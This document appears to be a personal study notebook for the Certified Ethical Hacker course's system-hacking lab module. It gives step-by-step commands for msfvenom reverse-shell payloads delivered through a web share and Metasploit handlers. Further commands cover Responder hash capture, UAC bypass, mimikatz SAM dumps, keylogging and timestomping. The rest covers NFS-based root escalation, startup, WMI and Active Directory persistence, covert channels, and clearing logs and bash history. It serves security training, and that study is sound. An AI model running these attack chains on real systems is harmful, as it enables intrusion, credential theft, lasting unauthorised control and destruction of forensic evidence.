CEH Notebook
============

System Hacking
--------------

Now, the next step for an ethical hacker or a penetration tester is to perform system hacking on the target system using all information collected in the earlier phases. System hacking is one of the most important steps that is performed after acquiring information through the above techniques. This information can be used to hack the target system using various hacking techniques and strategies.

System hacking helps to identify vulnerabilities and security flaws in the target system and predict the effectiveness of additional security measures in strengthening and protecting information resources and systems from attack.


In preparation for hacking a system, you must follow a certain methodology. You need to first obtain information during the footprinting, scanning, enumeration, and vulnerability analysis phases, which can be used to exploit the target system.

There are four steps in the system hacking:

- Gaining Access: Use techniques such as cracking passwords and exploiting vulnerabilities to gain access to the target system
- Escalating Privileges: Exploit known vulnerabilities existing in OSes and software applications to escalate privileges
- Maintaining Access: Maintain high levels of access to perform malicious activities such as executing malicious applications and stealing, hiding, or tampering with sensitive system files
- Clearing Logs: Avoid recognition by legitimate system users and remain undetected by wiping out the entries corresponding to malicious activities in the system logs, thus avoiding detection.



## Gain Access to the System

### Perform Active Online Attack to Crack the System’s Password using Responder

LLMNR (Link Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are two main elements of Windows OSes that are used to perform name resolution for hosts present on the same link. These services are enabled by default in Windows OSes and can be used to extract the password hashes from a user.

Since the awareness of this attack is low, there is a good chance of acquiring user credentials in an internal network penetration test. By listening for LLMNR/NBT-NS broadcast requests, an attacker can spoof the server and send a response claiming to be the legitimate server. After the victim system accepts the connection, it is possible to gain the victim’s user-credentials by using a tool such as Responder.py.

Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.



	chmod +x ./Responder.py
	sudo ./Responder.py -I ens3
	
Responder starts capturing the access logs of the Windows 11 machine. It collects the hashes of the logged-in user of the target machine.

Responder stores the logs in Home/Responder/logs: open the SMB-NTLMv2-SSP-10.10.1.11.txt file.
Crack this password hash using the John the Ripper:

	# sudo snap install john-the-ripper
	sudo john /home/ubuntu/Responder/logs/[Log File Name.txt]
	

### Audit System Passwords using L0phtCrack

L0phtCrack is a tool designed to audit passwords and recover applications. It recovers lost Microsoft Windows passwords with the help of a dictionary, hybrid, rainbow table, and brute-force attacks. It can also be used to check the strength of a password.

In this task, as an ethical hacker or penetration tester, you will be running the L0phtCrack tool by providing the remote machine’s administrator with user credentials. User account passwords that are cracked in a short amount of time are weak, meaning that you need to take certain measures to strengthen them.

As an ethical hacker or penetration tester, you can use the L0phtCrack tool for auditing the system passwords of machines in the target network and later enhance network security by implementing a strong password policy for any systems with weak passwords.


### Find Vulnerabilities on Exploit Sites

Exploit sites contain the details of the latest vulnerabilities of various OSes, devices, and applications. You can use these sites to find relevant vulnerabilities about the target system based on the information gathered, and further download the exploits from the database and use exploitation tools such as Metasploit, to gain remote access.

	https://www.exploit-db.com/
	
Here, we attempt to find the vulnerabilities of the target system using various exploit sites such as Exploit DB.

You can similarly use other exploit sites such as VulDB (https://vuldb.com), MITRE CVE (https://cve.mitre.org), Vulners (https://vulners.com), and CIRCL CVE Search (https://cve.circl.lu) to find target system vulnerabilities.


### Exploit Client-Side Vulnerabilities and Establish a VNC Session


	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe
Note: Here, the IP address of the host machine is 10.10.1.13 (Parrot Security machine).

This will generate Test.exe, a malicious file at the location /home/attacker/Desktop

Now, create a directory to share this file with the target machine, provide the permissions, and copy the file from Desktop to the shared location using the below commands:

	mkdir /var/www/html/share 		# create a shared folder
	chmod -R 755 /var/www/html/share
	chown -R www-data:www-data /var/www/html/share
	
Copy the malicious file to the shared location:

	cp /home/attacker/Desktop/Test.exe /var/www/html/share
	
Note: Here, we are sending the malicious payload through a shared directory; but in real-time, you can send it via an attachment in an email or through physical means such as a hard drive or pen drive.

Start the apache service:
	
	service apache2 start

Launch Metasploit framework and start the "Reverse TCP handler":

	msfconsole
	> use exploit/multi/handler
	> set payload windows/meterpreter/reverse_tcp
	> set LHOST 10.10.1.13
	> set LPORT 444
	> exploit


Download the exploit on the target (victim) machine:

	http://10.10.1.13/share	=> Download Test.exe and execute it.
	
	
On Parrot machine Meterpreter shell will open: 

	> sysinfo
	
If it does not open:

	> sessions -i 1

Upload the PowerSploit file:

	> upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
Note: PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.


Open a shell session. Observe that the present working directory points to the Downloads folder in the target system:

	> shell
	> powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”
Note: Ensure that you have added a space between two dots after -Command “.[space].. For a better understanding refer to the screenshot after step 25.

Revert to the Meterpreter session:

	> exit
	
Exploit VNC vulnerability to gain remote access to the Windows 11 machine:

	> run vnc

This will open a VNC session for the target machine, as shown in the screenshot. Using this session, you can see the victim’s activities on the system, including the files, websites, software, and other resources the user opens or runs.



### Gain Access to a Remote System using Armitage

	service postgresql start

Start Armitage from menu: Pentesting --> Exploitation Tools --> Metasploit Framework --> armitage

Scan for live hosts in the network: Hosts --> Nmap Scan --> Intense Scan

From the left-hand pane, expand the payload node, and then navigate to windows --> meterpreter; double-click meterpreter_reverse_tcp

The windows/meterpreter_reverse_tcp window appears. Scroll down to the LPORT Option, and change the port Value to 444. In the Output field, select exe from the drop-down options; click Launch.
The Save window appears. Select Desktop as the location, set the File Name as malicious_payload.exe, and click the Save button.

To share the malicious_payload.exe file with the target machine:

	mkdir /var/www/html/share
	chmod -R 755 /var/www/html/share
	chown -R www-data:www-data /var/www/html/share
	cp /root/Desktop/malicious_payload.exe /var/www/html/share/
	service apache2 start


Switch back to the Armitage window. In the left-hand pane, double-click meterpreter_reverse_tcp.
The windows/meterpreter_reverse_tcp window appears. Scroll down to LPORT Option and change the port Value to 444. Ensure that the multi/handler option is selected in the Output field; click Launch.


Copy to target machine by navigating to http://10.10.1.13/share. Execute malicious_payload.exe.

Right-click on the target host and navigate to Meterpreter 1 --> Interact --> Meterpreter Shell. Type sysinfo to view the system details of the exploited system.

Similarly, you can explore other options such as Desktop (VNC), Show Processes, Log Keystrokes, and Webcam Shot.

You can also escalate privileges in the target system using the Escalate Privileges option and further steal tokens, dump hashes, or perform other activities.


### Using Ninja Ronin


### Perform Buffer Overflow Attack to Gain Access to a Remote System


Use of Immunity Debugger to inspect vulnerable application crashes.

Generate the shellcode:

	msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b “\x00”

Note: Here, -p: payload, local IP address: 10.10.1.13, listening port: 4444., -f: filetype, -a: architecture, -b: bad character.



## Perform Privilege Escalation to Gain Higher Privileges


As a professional ethical hacker or pen tester, the second step in system hacking is to escalate privileges by using user account passwords obtained in the first step of system hacking. In privileges escalation, you will attempt to gain system access to the target system, and then try to attain higher-level privileges within that system. In this step, you will use various privilege escalation techniques such as named pipe impersonation, misconfigured service exploitation, pivoting, and relaying to gain higher privileges to the target system.

Privilege escalation is the process of gaining more privileges than were initially acquired. Here, you can take advantage of design flaws, programming errors, bugs, and configuration oversights in the OS and software application to gain administrative access to the network and its associated applications.

Backdoors are malicious files that contain trojan or other infectious applications that can either halt the current working state of a target machine or even gain partial or complete control over it. Here, you need to build such backdoors to gain remote access to the target system. You can send these backdoors through email, file-sharing web applications, and shared network drives, among other methods, and entice the users to execute them. Once a user executes such an application, you can gain access to their affected machine and perform activities such as keylogging and sensitive data extraction.


Privileges are a security role assigned to users for specific programs, features, OSes, functions, files, or codes. They limit access by type of user. Privilege escalation is required when you want to access system resources that you are not authorized to access. It takes place in two forms: vertical privilege escalation and horizontal privilege escalation.

Horizontal Privilege Escalation: An unauthorized user tries to access the resources, functions, and other privileges that belong to an authorized user who has similar access permissions

Vertical Privilege Escalation: An unauthorized user tries to gain access to the resources and functions of a user with higher privileges such as an application or site administrator


### Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities


Create the reverse shell exploit:

	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe


Use the Exploit to create a meterpreter remote session.

	msfconsole
	> use exploit/multi/handler
	> set payload windows/meterpreter/reverse_tcp
	> set LHOST 10.10.1.13
	> exploit -j -z
	> sessions -i 1 
	meterpreter > getuid


BeRoot is a privilege escalation tools, which allow you to run a configuration assessment on a target system to find out information about its underlying vulnerabilities, services, file and directory permissions, kernel version, architecture, as well as other data. Using this information, you can find a way to further exploit and elevate the privileges on the target system.


	meterpreter > upload /home/attacker/Desktop/BeRoot/beRoot.exe
	meterpreter > shell
	beRoot.exe
	
You can find further vulnerabilities in the resulting services and attempt to exploit them to escalate your privileges in the target system.

Note: Windows privileges can be used to escalated privileges. These privileges include SeDebug, SeRestore & SeBackup & SeTakeOwnership, SeTcb & SeCreateToken, SeLoadDriver, and SeImpersonate & SeAssignPrimaryToken. BeRoot lists all available privileges and highlights if you have one of these tokens.


Now we will use GhostPack Seatbelt tool to gather host information and perform security checks to find insecurities in the target system.


	exit
	meterpreter > upload /home/attacker/Desktop/Seatbelt.exe
	shell
	Seatbelt.exe -group=system		# gather information about AMSIProviders, AntiVirus, AppLocker etc.
	Seatbelt.exe -group=user		# gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc.
	Seatbelt.exe -group=misc		# gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc.
	exit

A lot more of other SeatBelt commands exist.


Another method for performing privilege escalation is to bypass the user account control setting (security configuration) using an exploit, and then to escalate the privileges using the Named Pipe Impersonation technique.


Check our current system privileges :

	meterpreter > run post/windows/gather/smart_hashdump
Note: You will not be able to execute commands (such as hashdump, which dumps the user account hashes located in the SAM file, or clearev, which clears the event logs remotely) that require administrative or root privileges (Insufficient privileges to dump hashes!).

Attempts to elevate the user privileges:

	meterpreter > getsystem -t 1	# Uses the service – Named Pipe Impersonation (In Memory/Admin) Technique.
	
The command fails to escalate privileges and returns an error stating Operation failed.


try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.

Note: In this task, we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit:


	meterpreter > background 	# moves the current Meterpreter session to the background.
	use exploit/windows/local/bypassuac_fodhelper
	show options
	set SESSION 1 (1 is the current Meterpreter session which is running in the background)
	show options
	set LHOST 10.10.1.13	# if needed
	set LPORT 4444			# if needed
	set TARGET 0			# (here, 0 indicates nothing, but the Exploit Target ID).
	exploit
	
	
	meterpreter > getuid		# still normal privileges
	meterpreter > getsystem -t 1	# Elevate privileges. If not successful, try getsystem
	meterpreter > getuid		# now running with system privileges (NT AUTHORITY\SYSTEM)
	
Note: In Windows OSes, named pipes provide legitimate communication between running processes. You can exploit this technique to escalate privileges on the victim system to utilize a user account with higher access privileges.

Check if we have successfully obtained the SYSTEM/admin:

	meterpreter > run post/windows/gather/smart_hashdump	# Wz obtain password hashes
	
	meterpreter > clearev 		# clear the event logs that require administrative or root privileges.



### Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter


Create the exploit:

	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Backdoor.exe
	
Copy it on a shared folder:

	mkdir /var/www/html/share
	chmod -R 755 /var/www/html/
	chown -R www-data:www-data /var/www/html/share
	cp /home/attacker/Desktop/Backdoor.exe /var/www/html/share/
	service apache2 start


Launch Metasploit:

	msfconsole
	> use exploit/multi/handler
	> set payload windows/meterpreter/reverse_tcp
	> set LHOST 10.10.1.13
	> show options 
	> exploit -j -z		# start the handler

On target machine, download the backdoored exe and execute it:

	http://10.10.1.13/share 

Open meterpreter session:

	meterpreter > sessions -i 1
	meterpreter > sysinfo		# also: ipconfig, getuid, pwd, ls, cat [filename.txt], idletime 
	meterpreter > ipconfig
	meterpreter > getuid


While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.

Change the MACE attributes of the Secret.txt file:

	meterpreter > timestomp Secret.txt -v 
	meterpreter > timestomp Secret.txt -m “02/11/2018 08:10:03”	# changes the Modified value
Note: you can change the Accessed (-a), Created (-c), and Entry Modified (-e)


Search for a file:

	meterpreter > cd C:/
	meterpreter > pwd
	meterpreter > search -f [Filename.extension]
	
Start a key_logger:

	meterpreter > keyscan_start		# wait for victim use its keyboard
	meterpreter > keyscan_dump


	meterpreter > shell		# open a shell in meterpreter
	dir /a:h				# retrieve the directory names with hidden attributes
	sc queryex type=service state=all	# list all the available services
	netsh firewall show state	# display current firewall state
	netsh firewall show config	# view the current firewall settings
	wmic /node:"" product get name,version,vendor	# details of installed software
	wmic cpu get	# processor’s details
	wmic useraccount get name,sid 	# retrieve login names and SIDs of the users
	wmic os where Primary='TRUE' reboot	# reboot the target system
	
	


### Escalate Privileges by Exploiting Vulnerability in pkexec

Polkit or Policykit is an authorization API used by programs to elevate permissions and run processes as an elevated user. The successful exploitation of the Polkit pkexec vulnerability allows any unprivileged user to gain root privileges on the vulnerable host.

In the pkexec.c code, there are parameters that doesn’t handle the calling correctly which ends up in trying to execute environment variables as commands. Attackers can exploit this vulnerability by designing an environment variable in such a manner that it will enable pkexec to execute an arbitrary code.

Note: This vulnerability has already been patched in newer versions of Unix-based operating systems. Here, we are exploiting the vulnerability for the sake of demonstrating how the attackers can search for the latest vulnerabilities in the target operating system using online resources such as Exploit-Db and further exploit them to gain unauthorized access or escalated privileges to the target system.


### Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS


On target Linux machine:

	sudo apt update
	sudo apt install nfs-kernel-server
	

	sudo nano /etc/exports
Note: /etc/exports file holds a record for each directory that user wants to share within a network machine.

	/home *(rw,no_root_squash)
Note: /home *(rw,no_root_squash) entry shows that /home directory is shared and allows the root user on the client to access files and perform read/write operations. * sign denotes connection from any host machine.


restart the nfs server to apply the configuration changes:

	sudo /etc/init.d/nfs-kernel-server restart



On attacker side:

Check port 2049 is open and nfs service is running on it:

	nmap -sV 10.10.1.9
	
	sudo apt-get install nfs-common

Check if any share is available for mount in the target machine:

	showmount -e 10.10.1.9
Note: If you receive clnt_create: RPC: Program not registered error, restart target machine and  sudo /etc/init.d/nfs-kernel-server restart.


	mkdir /tmp/nfs
	sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
	cd /tmp/nfs
	sudo cp /bin/bash .
	sudo chmod +s bash
	ls -la bash
	sudo df -h


try to login into target machine using ssh:

	ssh -l ubuntu 10.10.1.9		# in target’s password field enter toor 
	cd /home
	ls
	./bash -p	# open a bash shell
	id		# get the id’s of users
	whoami	# check for root access

Now we have got root privileges on the target machine, we will install nano editor in the target machine so that we can exploit root access

	cp /bin/nano .
	chmod 4777 nano
	ls -la nano
	cd /home
	ls

open the shadow file from where we can copy the hash of any user:

	./nano -p /etc/shadow

copy any hash from the file and crack it using john the ripper or hashcat tools, to get the password of desired users.


	cat /etc/crontab	# view the running cronjobs
	ps -ef			# view current processes along with their PIDs
	find / -name "*.txt" -ls 2> /dev/null
	route -n 	# view the host/network names in numeric form
	find / -perm -4000 -ls 2> /dev/null		# view the SUID executable binaries



### Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys

Sticky keys is a Windows accessibility feature that causes modifier keys to remain active, even after they are released. Sticky keys help users who have difficulty in pressing shortcut key combinations. They can be enabled by pressing Shift key for 5 times. Sticky keys also can be used to obtain unauthenticated, privileged access to the machine.


Open a reverse TCP shell on target Windows machine.

	meterpreter > sysinfo
	meterpreter > getuid
	
Try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine:

	meterpreter > background	# background the current session.
	search bypassuac	# get the list of bypassuac modules
	
Note: In this task, we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.
	
	use exploit/windows/local/bypassuac_fodhelper
	set session 1
	show options
	set LHOST 10.10.1.13
	set TARGET 0 
	exploit
	
The BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine:
	
	meterpreter > getsystem -t 1	# elevate privileges
	meterpreter > getuid 	# now running with system privileges
	
Load mimikatz:

	meterpreter > load kiwi
	meterpreter > help kiwi
	meterpreter > lsa_dump_sam 	# load NTLM Hash of all users
Note: LSA secrets are used to manage a system's local security policy, and contain sesnsitive data such as User passwords, IE passwords, service account passwords, SQL passwords etc.

Change the password of Admin using the password_change module:


	meterpreter > password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password
	meterpreter > lsa_dump_sam	# Check the new hash value
	
Password has now been changed to 'password'.


## Maintain Remote Access and Hide Malicious Activities

As a professional ethical hacker or pen tester, the next step after gaining access and escalating privileges on the target system is to maintain access for further exploitation on the target system.

Now, you can remotely execute malicious applications such as keyloggers, spyware, backdoors, and other malicious programs to maintain access to the target system. You can hide malicious programs or files using methods such as rootkits, steganography, and NTFS data streams to maintain access to the target system.

Maintaining access will help you identify security flaws in the target system and monitor the employees’ computer activities to check for any violation of company security policy. This will also help predict the effectiveness of additional security measures in strengthening and protecting information resources and systems from attack.


### User System Monitoring and Surveillance using Power Spy

Power Spy is a computer activity monitoring software that allows you to secretly log all users on a PC while they are unaware. After the software is installed on the PC, you can remotely receive log reports on any device via email or FTP. You can check these reports as soon as you receive them or at any convenient time. You can also directly check logs using the log viewer on the monitored PC.



### Hide Files using NTFS Streams

A professional ethical hacker or pen tester must understand how to hide files using NTFS (NT file system or New Technology File System) streams. NTFS is a file system that stores any file with the help of two data streams, called NTFS data streams, along with file attributes. The first data stream stores the security descriptor for the file to be stored such as permissions; the second stores the data within a file. Alternate data streams are another type of named data stream that can be present within each file.


	notepad readme.txt
	type calc.exe > readme.txt:calc.exe
	dir
	mklink backdoor.exe readme.txt:calc.exe
	backdoor.exe



### Hide Data using White Space Steganography

Snow is a program that conceals messages in text files by appending tabs and spaces to the end of lines, and that extracts hidden messages from files containing them. The user hides the data in the text file by appending sequences of up to seven spaces, interspersed with tabs.

### Image Steganography using OpenStego and StegOnline

OpenStego

OpenStego is an image steganography tool that hides data inside images. It is a Java-based application that supports password-based encryption of data for an additional layer of security. It uses the DES algorithm for data encryption, in conjunction with MD5 hashing to derive the DES key from the provided password.

StegOnline

StegOnline is a web-based, enhanced and open-source port of StegSolve. It can be used to browse through the 32 bit planes of the image, extract and embed data using LSB steganography techniques and hide images within other image bit planes.

You can also use other image steganography tools such as QuickStego (http://quickcrypto.com), SSuite Picsel (https://www.ssuitesoft.com), CryptaPix (https://www.briggsoft.com), and gifshuffle (http://www.darkside.com.au) to perform image steganography on the target system.


### Maintain Persistence by Abusing Boot or Logon Autostart Execution


Open a reverse TCP shell on target Windows machine.

try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.

	background
	use exploit/windows/local/bypassuac_fodhelper
	set session 1
	show options
	set LHOST 10.10.1.13
	set TARGET 0
	exploit
	
Elevate privileges:

	getsystem -t 1 
	getuid
	cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”
	pwd
	

Payload that needs to be uploaded into the Startup folder of Windows 11 machine:

	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe > payload.exe
	
upload the malicious file into the Windows 11 machine:

	upload /home/attacker/payload.exe
	
Restart the Windows 11 machine. open another terminal window with root privileges:

	msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost 10.10.1.13
	set lport 8080
	exploit

restart the Windows machine so that the malicious file that is placed in the startup folder is executed.


Whenever the Admin restarts the system, a reverse shell is opened to the attacker until the payload is detected by the administrator.

Thus attacker can maintain persistence on the target machine using misconfigured Startup folder.


### Maintain Domain Persistence by Exploiting Active Directory Objects

AdminSDHolder is an Active Directory container with the default security permissions, it is used as a template for AD accounts and groups, such as Domain Admins, Enterprise Admins etc. to protect them from unintentional modification of permissions.

If a user account is added into the access control list of AdminSDHolder, the user will acquire "GenericAll" permissions which is equivalent to domain administrators.


Create the exploit:

	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Exploit.exe

And share it via '/var/www/html/share' (http://10.10.1.13/share/)

	msfconsole
	> use exploit/multi/handler
	> set payload windows/meterpreter/reverse_tcp
	> set lhost 10.10.1.13
	> set lport 444
	> run

Execute the exploit on the target machine.

Upload the PowerTools-Master:

	meterpreter > getuid	# Administrator
	meterpreter > upload -r /home/attacker/PowerTools-master C:\\Users\\Administrator\\Downloads
	meterpreter > shell
	cd C:\Windows\System32
	powershell

As we have access to PowerShell access with admin privileges, we can add a standard user Martin in the CEH domain to the AdminSDHolder directory and from there to the Domain Admins group, to maintain persistence in the domain.

	PS > cd C:\Users\Administrator\Downloads\PowerView
	PS > Import-Module ./powerview.psm1
	PS > Add_ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
	PS > Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs	# Check user Martin now has GenericALL active directory rights

Normally the changes in ACL will propagate automatically after 60 minutes, we can enter the following command to reduce the time interval of SDProp to 3 minutes:

	PS > REG ADD HKML\SYSTEM\SYSTEM\CyrrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
Note: Microsoft doesn’t recommend the modification of this setting, as this might cause performance issues in relation to LSASS process across the domain.


Check result on target machine: open Server Manager window.
Tools -> Active Directory Users and Computers
Active Directory Users and Computers / View -> Advanced Features
In nodes CEH.com -> System nodes -> right click on AdminSDHolder folder -> Properties
In AdminSDHolder Properties window -> Security: Martin has been added as a member.


On meterpreter shell:

	PS > net group “Domain Admins” Martin /add /domain

Check on target machine: Active Directory Users and Computers -> Users -> right-click on Martin J -> properties
Martin J. Properties -> Member Of : We can see that the Martin user is successfully added to the Domain Admins group.


Verify if the domain controller is now accessible to the user Martin and domain persistence has been established:

	Signout / signin with CEH\Martin and 'apple' password

Open a powershell window:

	PS > dir \\10.10.1.22\C$
Domain Controller is now accessible to Martin and thus domain persistence has been established.

			#

### Privilege Escalation and Maintain Persistence using WMI

WMI (Windows Management Instrumentation) event subscription can be used to install event filters, providers, and bindings that execute code when a defined event occurs. It enables system administrators to perform tasks locally and remotely.

Here, we will exploit WMI event subscription to gain persistent access to the target system.

Note: In this task we will create two payloads, one to gain access to the system and another for WMI event subscription.


	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Payload.exe
	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/wmi.exe

Transfer both payloads to the Windows Server 2019 machine.
Execute Payload: there is a security warning, but meterpreter session has already opened!

	meterpreter > getuid
	meterpreter > upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads
	meterpreter > load powershell		# PS extention
	meterpreter > powershell_shell 
	PS > Import-Module ./WMI-Persistence.ps1
	PS > Install-persistence -Trigger Startup -Payload "C:\Users\Administrator\Downloads\wmi.exe"
Note: It will take approximately 5 minutes for the script to run.


In a new root terminal:

	msfconsole
	> use exloit/multi/handler
	> set payload windows/meterpreter/reverse_tcp
	> set lhost 10.10.1.13
	> set lport 444
	> exploit
	
In previous terminal (meterpreter/PS), terminate channel:

	ctrl+c , Yes

Restart target machine. In the terminal, previous session will be closed.
Now, on the second terminal and we can see that the meterpreter session is opened (after approximately 5-10 minutes).

	meterpreter > getuid 	# We got system privileges and persistence on the target machine.



### Covert Channels using Covert_TCP

Networks use network access control permissions to permit or deny the traffic flowing through them. Tunneling is used to bypass the access control rules of firewalls, IDS, IPS, and web proxies to allow certain traffic. Covert channels can be created by inserting data into the unused fields of protocol headers. There are many unused or misused fields in TCP or IP over which data can be sent to bypass firewalls.

The Covert_TCP program manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can act like a server as well as a client and can be used to hide the data transmitted inside an IP header. This is useful when bypassing firewalls and sending data with legitimate-looking packets that contain no data for sniffers to analyze.



	> mkdir Send
	> cd Send
	> echo "secret Message" > message.txt
	
Copy covert_tcp.c in this folder:

	> cc -o covert_tcp covert_tcp.c
	
On target machine:

	> tcpdump -nvvx port 8888 -i lo
	> mkdir Receive
	> cd Receive
	
Copy covert_tcp.c in this folder:

	> cc -o covert_tcp covert_tcp.c
	> ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
	
On sender:

	> ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
	

## Clear Logs to Hide the Evidence of Compromise

In the previous labs, you have seen different steps that attackers take during the system hacking lifecycle. They start with gaining access to the system, escalating privileges, executing malicious applications, and hiding files. However, to maintain their access to the target system longer and avoid detection, they need to clear any traces of their intrusion. It is also essential to avoid a traceback and possible prosecution for hacking.

A professional ethical hacker and penetration tester’s last step in system hacking is to remove any resultant tracks or traces of intrusion on the target system. One of the primary techniques to achieve this goal is to manipulate, disable,or erase the system logs. Once you have access to the target system, you can use inbuilt system utilities to disable or tamper with the logging and auditing mechanisms in the target system.

This task will demonstrate how the system logs can be cleared, manipulated, disabled, or erased using various methods.

### View, Enable, and Clear Audit Policies using Auditpol

On Windows 11, start a cmd in Admin mode:

	> auditpol /get /category:*		# view all the audit policies
	
Enable the audit policies:

	> auditpol /set /category:"system", "account logon", /success:enable /failure:enable

Clear the audit policies:

	> auditpol /clear /y
Note: For demonstration purposes, we are clearing logs on the same machine. In real-time, the attacker performs this process after gaining access to the target system to clear traces of their malicious activities from the target system.


### Clear Windows Machine Logs using Various Utilities

There are various Windows utilities that can be used to clear system logs such as Clear_Event_Viewer_Logs.bat, wevtutil, and Cipher.

Note: Clear_Event_Viewer_Logs.bat is a utility that can be used to wipe out the logs of the target system. This utility can be run through command prompt or PowerShell, and it uses a BAT file to delete security, system, and application logs on the target system. You can use this utility to wipe out logs as one method of covering your tracks on the target system.


wevtutil:

wevtutil is a command-line utility used to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, run queries, and export, archive, and clear logs.

Open a Command Prompt window with Administrator privileges:

	> wevtutil el 		# display a list of event logs.
Note: el | enum-logs lists event log names.

	> wevtutil cl [log_name]	# (here, we are clearing system logs)  clear a specific event log.
Note: cl | clear-log: clears a log, log_name is the name of the log to clear, and ex: is the system, application, and security.

Similarly, you can also clear application and security logs by issuing the same command with different log names (application, security).


Cipher:

Cipher.exe is an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery. This command also assists in encrypting and decrypting data in NTFS partitions.

	> cipher /w:[Drive or Folder or File Location]	# overwrite deleted files in a specific drive, folder, or file.
Note: Here, we are encrypting the deleted files on the C: drive. You can run this utility on the drive, folder, or file of your choice.

The Cipher.exe utility starts overwriting the deleted files, first, with all zeroes (0x00); second, with all 255s (0xFF); and finally, with random numbers, as shown in the screenshot.

Note: When an attacker creates a malicious text file and encrypts it, at the time of the encryption process, a backup file is created. Therefore, in cases where the encryption process is interrupted, the backup file can be used to recover the data. After the completion of the encryption process, the backup file is deleted, but this deleted file can be recovered using data recovery software and can further be used by security personnel for investigation. To avoid data recovery and to cover their tracks, attackers use the Cipher.exe tool to overwrite the deleted files.


### Clear Linux Machine Logs using the BASH Shell

The BASH or Bourne Again Shell is a sh-compatible shell that stores command history in a file called bash history. You can view the saved command history using the more ~/.bash_history command. This feature of BASH is a problem for hackers, as investigators could use the bash_history file to track the origin of an attack and learn the exact commands used by the intruder to compromise the system.


Open a terminal:

	$ export HISTSIZE=0	# disable the BASH shell from saving the history.
Note: HISTSIZE: determines the number of commands to be saved, which will be set to 0.


	$ history -c 		# Enter to clear the stored history.
Note: This command is an effective alternative to the disabling history command; with history -c, you have the convenience of rewriting or reviewing the earlier used commands.

	$ history -w 	# delete the history of the current shell, leaving the command history of other shells unaffected.
	
	$ shred ~/.bash_history 	# shred the history file, making its content unreadable.
	$  more ~/.bash_history 	# view the shredded history content
Note: This command is useful in cases where an investigator locates the file; because of this command, they would be unable to read any content in the history file.

All these commands in one line:

	$ shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit
Note: This command first shreds the history file, then deletes it, and finally clears the evidence of using this command.


### Hiding Artifacts in Windows and Linux Machines

On Windows:
Open a cmd in Administrator mode:

	> mkdir Test
	> dir	# Check for directory presence
	> attrib +h +s +r Test	# hide the Test folder
	> dir	# Test directory is now hidden.
	> attrib -s -h -r Test	# unhide the directory
	> dir

Hide the user accounts:

	> net user Test /add	# Add user Test in the machine
	> net user Test /active:yes		# Activate the Test account

Look for Test user account to be created. Now hide it:

	> net user Test /activate:no	# Test account is removed from the list
	



On Linux:
Hide file:

	$ mkdir Test
	$ cd Test
	$ >> Sample.txt		# create Sample.txt file.
	$ touch Sample.txt
	$ ls
	$ touch .Secret.txt		# create Secret.txt file.
	$ ls	# only Sample.txt file can be seen and Secret.txt file is hidden.
	$ ls -al 	# Secret.txt file is visible now

Note: In a real scenario, attackers may attempt to conceal artifacts corresponding to their malicious behavior to bypass security controls. Attackers leverage this OS feature to conceal artifacts such as directories, user accounts, files, folders, or other system-related artifacts within the existing artifacts to circumvent detection.


### Clear Windows Machine Logs using CCleaner

